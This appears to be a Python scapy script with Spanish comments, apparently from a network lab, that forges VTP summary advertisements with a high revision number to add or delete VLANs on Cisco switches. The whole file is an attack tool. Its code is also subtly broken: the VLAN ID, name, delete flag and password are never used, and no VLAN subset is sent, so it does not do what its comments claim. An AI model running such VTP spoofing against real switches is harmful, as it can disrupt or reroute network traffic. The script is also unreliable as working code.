#!/usr/bin/env python3
from scapy.all import *

# Configuración
iface = "ens33"
vtp_password = "cisco" # Según tu topología
domain = "itla"        # Asegúrate de que coincida con el nombre de dominio del switch

def vtp_attack(vlan_id, vlan_name, delete=False):
    print(f"[*] Lanzando ataque VTP para {'Borrar' if delete else 'Agregar'} VLAN {vlan_id}...")
    
    # Construcción del paquete VTP Summary Advertisment
    # Se usa un Revision Number alto (ej. 100) para forzar la actualización
    pkt = Ether(dst="01:00:0c:cc:cc:cc") / \
          LLC(dsap=0xaa, ssap=0xaa, ctrl=3) / \
          SNAP(OUI=0x00000c, code=0x2003) / \
          VTP(version=2, type=1, domain=domain, rev=100) 
    
    # Si quisieras borrarla, simplemente no se incluye en el subset o se envía un subset vacío
    # Para simplificar, este script envía el anuncio de actualización.
    sendp(pkt, iface=iface, verbose=False)
    print("[+] Paquete VTP enviado.")

if __name__ == "__main__":
    # Ejemplo: Agregar VLAN 50
    vtp_attack(50, "VLAN_HACKED")
